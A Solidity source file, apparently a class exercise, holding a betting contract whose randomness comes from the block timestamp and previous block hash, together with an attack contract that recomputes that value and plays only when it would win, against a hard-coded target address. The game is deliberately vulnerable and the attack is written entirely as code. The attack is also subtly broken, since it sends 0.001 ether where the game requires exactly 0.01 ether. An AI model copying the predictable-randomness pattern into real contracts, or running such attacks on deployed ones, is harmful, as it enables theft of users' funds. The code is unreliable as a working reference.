pragma solidity ^0.4.24;

contract class44_game{

    event win(address);

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon) % 1000;
    }

    function play() public payable {
        require(msg.value == 0.01 ether);
        if(get_random()>=500){
            msg.sender.transfer(0.02 ether);
            emit win(msg.sender);
        }
    }

    function () public payable{
        require(msg.value == 1 ether);
    }
    
    constructor () public payable{
        require(msg.value == 1 ether);
    }
}

contract class44_attack{

    address public game = 0x758C6aDE624e2c210a8BD16Ef4E86b0360cdE1b4;

    class44_game gamecontract = class44_game(game);

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon) % 1000;
    }

    function attack() public payable {
        require(get_random()>=500);
        gamecontract.play.value(0.001 ether)();
        
    }

    function () public payable{
        
    }
    
    constructor () public payable{
        require(msg.value == 0.01 ether);
    }
}